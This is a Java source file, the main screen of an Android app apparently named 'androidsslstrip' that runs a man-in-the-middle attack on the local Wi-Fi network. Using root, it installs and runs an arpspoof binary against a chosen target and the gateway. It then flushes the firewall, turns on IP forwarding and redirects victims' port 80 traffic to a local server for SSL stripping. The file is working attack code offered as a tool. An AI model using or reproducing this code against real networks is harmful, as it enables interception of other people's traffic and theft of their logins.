package com.crazyricky.androidsslstrip;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.MatrixCursor;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.text.format.Formatter;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

public class Main extends Activity {
    
    private static boolean sArpspoofRunning = false;
    private static boolean sSSLStripRunning = false;
    
    private EditText mTargetIpEditText;
    private Button mArpspoofBtn;
    private Button mSSLStripBtn;
    private Button mStopAllBtn;
    private TextView mLogTextView;
    private static Handler sLogHandler;
    
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        init();
        updateUI();
    }
    
    private void init() {
        mTargetIpEditText = (EditText) this.findViewById(R.id.target_ip_edittext);
        mArpspoofBtn = (Button) this.findViewById(R.id.arpspoof_btn);
        mSSLStripBtn = (Button) this.findViewById(R.id.sslstrip_btn);
        mStopAllBtn = (Button) this.findViewById(R.id.stop_all_btn);
        mLogTextView = (TextView) this.findViewById(R.id.log_textview);
        
        mArpspoofBtn.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                sArpspoofRunning = true;
                updateUI();
                
                WifiManager wifii= (WifiManager) getSystemService(Context.WIFI_SERVICE);
                String gatewayIP = Formatter.formatIpAddress(wifii.getDhcpInfo().gateway);
                String targetIP = mTargetIpEditText.getText().toString();
                startArpspoof(targetIP, gatewayIP);
            }
        });
        
        mSSLStripBtn.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                sSSLStripRunning = true;
                updateUI();
                startSSLStrip();
            }
        });
        
        mStopAllBtn.setOnClickListener(new OnClickListener() {
            public void onClick(View v) {
                stopAll();
            }
        });
        
        sLogHandler = new Handler() {
            private StringBuffer buffer = new StringBuffer("");
            public void handleMessage(Message msg) {
                String newMsg = (String)msg.obj;
                buffer.append(newMsg).append("\n");
                mLogTextView.setText(buffer);
            }
        };
        
        SharedPreferences sp = getSharedPreferences("config", Context.MODE_PRIVATE);
        boolean understand = sp.getBoolean("understand", false);
        if (!understand) {
            Intent intent = new Intent();
            intent.setClass(this, ConfigMenu.class);
            startActivityForResult(intent, 0);
        }
    }
    
    private void updateUI() {
        if (sArpspoofRunning || sSSLStripRunning) {
            mStopAllBtn.setEnabled(true);
        } else {
            mStopAllBtn.setEnabled(false);
        }
        
        mArpspoofBtn.setEnabled(!sArpspoofRunning);
        mSSLStripBtn.setEnabled(sArpspoofRunning && !sSSLStripRunning);
    }
    
    private void extractArpspoof() {
        final InputStream is = getResources().openRawResource(R.raw.arpspoof);
        FileOutputStream out = null;
        final byte[] buff = new byte[4096];
        try {
            out = openFileOutput("arpspoof", Context.MODE_PRIVATE);
            while(is.read(buff) > 0)
                out.write(buff);
        } catch (FileNotFoundException e) {
        } catch (IOException e) {
        } finally {
            try {
                out.close();
            } catch (IOException e) {
            }
        }
    }
    
    private void installArpspoof() {
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("mkdir /data/local/bin/"+ "\n");
            os.writeBytes("cp " + getFileStreamPath("arpspoof") + " " + getArpspoofPath() + "\n");
            os.writeBytes("chmod 770 " + getArpspoofPath() + "\n");
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }
    
    private void startArpspoof(final String targetIP, final String gatewayIP) {
        extractArpspoof();
        installArpspoof();
        final String exePath = getArpspoofPath();
        new Thread() {
            public void run() {
                runSpoof();
            }
            
            private void runSpoof() {
                try {
                    
                    SharedPreferences sp = getSharedPreferences("config", Context.MODE_PRIVATE);
                    String wifi = sp.getString("wifi", null);
                    if (wifi == null || wifi.equals("")) {
                        wifi = "wlan0";
                    }
                    
                    Process process = Runtime.getRuntime().exec("su");
                    DataOutputStream os = new DataOutputStream(
                            process.getOutputStream());
                    String command = "";
                    if (!targetIP.equals("")) {
                        command = exePath + " -i "+ wifi  +" -t " + targetIP + " " + gatewayIP + "&\n";
                    } else {
                        command = exePath + " -i "+ wifi  +" " + gatewayIP + "&\n";
                    }
                    while(sArpspoofRunning) {
                        if (isRunning()) {
                            try {
                                Thread.sleep(5000);
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        } else {
                            os.writeBytes(command);
                            os.flush();
                        }
                    }
                    process.destroy();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            
            private boolean isRunning() {
                boolean result = false;
                Process process;
                try {
                    process = Runtime.getRuntime().exec("ps");

                    BufferedReader mReader = new BufferedReader(new InputStreamReader(process.getInputStream()),1024);
                    
                    String line;
                    while ((line = mReader.readLine()) != null) {
                        if (line.length() == 0) {
                            continue;
                        }
                        if (line.contains("arpspoof")) {
                            result = true;
                        }
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return result;
            }
        }.start();
    }
    
    private void startSSLStrip() {
        Logging.startLogging(this);
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("iptables -F;iptables -X;iptables -t nat -F;iptables -t nat -X;iptables -t mangle -F;iptables -t mangle -X;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT\n");
            os.flush();
            os.writeBytes("echo '1' > /proc/sys/net/ipv4/ip_forward\n");
            os.flush();
            os.writeBytes("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        NanoHTTPD.startInstance("8080", "/sdcard/");
    }
    
    private void stopAll() {
        // stop arpspoof
        try {
            Process process = Runtime.getRuntime().exec("su");
            DataOutputStream os = new DataOutputStream(process.getOutputStream());
            os.writeBytes("killall -9 arpspoof\n");
            os.flush();
            os.writeBytes("exit\n");
            os.flush();
            process.waitFor();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        
        // stop sslstrip
        NanoHTTPD.stopInstance();
        
        // update UI
        sArpspoofRunning = false;
        sSSLStripRunning = false;
        
        Logging.stopLogging();
        updateUI();
    }
    
    private String getArpspoofPath() {
        return "/data/local/bin/arpspoof";
    }
    
    public static void updateLog(String newMessage) {
        Message msg = Message.obtain();
        msg.obj = newMessage;
        sLogHandler.sendMessage(msg);
    }
    
    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        Intent intent = new Intent();
        intent.setClass(this, ConfigMenu.class);
        startActivity(intent);
        return false;
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == Activity.RESULT_CANCELED) {
            finish();
        }
    }
}